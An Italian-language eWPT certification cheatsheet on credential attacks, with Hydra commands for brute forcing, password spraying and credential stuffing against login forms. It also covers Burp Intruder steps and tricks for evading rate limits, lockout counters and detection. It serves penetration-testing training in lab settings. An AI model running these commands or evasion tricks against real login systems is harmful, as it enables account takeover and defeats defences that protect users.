---
layout: cheatsheet
cert: ewpt
cert_label: "eWPT"
title: "Credential Attacks"
permalink: "/cheatsheet/ewpt/06-authentication-authorization/05-credential-attacks/"
section: "Authentication & Authorization"
section_order: 6
order: 5
sort_key: 605
---

**Difficoltà:** Intermediate
**Time to Master:** 2h
**Prerequisiti:** [04-IDOR.md](/cheatsheet/ewpt/06-authentication-authorization/04-idor/)
**Lab:** HTB / DVWA, brute force login

---

## Obiettivo

Qui torni alle basi, ma con più criterio di un semplice "lancio Hydra e vediamo": testi la robustezza dei meccanismi di autenticazione tramite bruteforce, dictionary attack, credential stuffing e password spraying, sapendo quale tecnica scegliere e rispettando i limiti di rate/lockout tipici di un ambiente reale — cosa che in lab si dimentica facilmente, ma in un engagement vero ti gioca brutti scherzi.

---

## Concetti chiave

### Differenza tra le tecniche

| Tecnica | Descrizione | Quando usarla |
|---------|-------------|-----------------|
| Bruteforce | tutte le combinazioni possibili | spazio piccolo (PIN, username corti) |
| Dictionary attack | wordlist di password comuni su un utente noto | utente noto, password debole sospetta |
| Credential stuffing | credenziali reali trapelate (breach) su più account | riuso password tra servizi diversi |
| Password spraying | poche password comuni su MOLTI utenti | evita lockout per singolo utente |

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| Hydra | `hydra -l admin -P rockyou.txt target.com http-post-form "..."` | credenziali valide | supporta molti protocolli |
| Burp Intruder | Cluster bomb su user+pass | risposta per combinazione | più controllo su condizioni di successo |
| ffuf | fuzzing su form POST | risposta filtrata per size | leggero e veloce |

---

## Payload / Esempi

### Esempio 1: bruteforce login form con Hydra

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com \
  http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

**Spiegazione:** l'ultimo campo (`Invalid credentials`) è la stringa che identifica un tentativo FALLITO nella response: Hydra la usa per distinguere successo da fallimento.

### Esempio 2: password spraying per evitare lockout

```bash
for user in $(cat users.txt); do
  hydra -l "$user" -p "Summer2026!" target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
  sleep 30   # rispetta eventuali soglie di lockout basate su tempo
done
```

**Spiegazione:** una singola password comune (stagionale, aziendale) provata su MOLTI username evita di far scattare il lockout per tentativi ripetuti sullo stesso account.

### Esempio 3: bruteforce con Burp Intruder (quando serve gestire token CSRF dinamici)

```
1. Send to Intruder la richiesta di login
2. Imposta payload position su username e password
3. Attack type: Cluster bomb (combinazioni complete) o Pitchfork (liste abbinate)
4. Analizza per "Response received" length o "Grep - Match" sul messaggio di errore
```

**Spiegazione:** Burp Intruder è preferibile a Hydra quando il form richiede un token CSRF che cambia ad ogni richiesta (serve macro/session handling rule).

### Esempio 4: credential stuffing con lista breach nota

```bash
hydra -C combo_list.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

**Spiegazione:** `-C` usa un file "user:pass" combinato invece di liste separate, tipico formato dei breach dump pubblici.

---

## Evasion / Bypass Techniques

### Bypass rate-limit con rotazione IP/header

```
X-Forwarded-For: 1.2.3.4  (varia ad ogni richiesta)
```

### Bypass lockout basato su username case-sensitive

```
admin / Admin / ADMIN
```
Alcuni sistemi trattano username come case-sensitive per il lockout counter ma case-insensitive per il login stesso: variare il case può resettare il contatore di tentativi falliti.

### Rallentare per restare sotto la soglia di detection

```bash
hydra -l admin -P wordlist.txt -t 1 -W 5 target.com http-post-form "..."
```

`-t 1` (un solo thread) e `-W 5` (wait tra richieste) riducono il rumore generato.

---

## Lab Hands-On

### Lab 1: DVWA, Brute Force (low/medium/high)
**Obiettivo:** bruteforce del login con Hydra/Burp su livelli di difficoltà crescente
**Difficulty:** Facile-Medio
**Time:** 1h

**Walkthrough breve:**
1. Livello low: bruteforce diretto con Hydra
2. Livello medium: gestisci eventuale delay artificiale
3. Livello high: gestisci token CSRF con Burp Intruder + session handling rule

---

## Common Mistakes

- Ignorare completamente i limiti di rate in un engagement reale -> puoi causare DoS involontario o bloccare account legittimi, sempre da concordare con il cliente prima
- Usare bruteforce classico quando password spraying sarebbe più efficace ed evita lockout
- Non gestire token CSRF dinamici -> Hydra fallisce silenziosamente se il form richiede un token che cambia ad ogni richiesta, e perdi tempo a capire perché "non funziona niente"

---

## Link Utili

- [Hydra GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [SecLists: Passwords](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

---

## Connessioni

- **Prerequisito:** [04-IDOR.md](/cheatsheet/ewpt/06-authentication-authorization/04-idor/)
- **Prossimo Step:** [06-JWT-Exploitation.md](/cheatsheet/ewpt/06-authentication-authorization/06-jwt-exploitation/)
- **Combinazione con:** [01-Reconnaissance/03-OSINT-Tools.md](/cheatsheet/ewpt/01-reconnaissance/03-osint-tools/)

---

## Checklist di padronanza

- [ ] So la differenza pratica tra bruteforce, dictionary, stuffing, spraying
- [ ] So usare Hydra per form POST con rilevamento fallimento corretto
- [ ] So usare Burp Intruder quando c'è un token CSRF dinamico
- [ ] Conosco tecniche per evitare/ridurre lockout
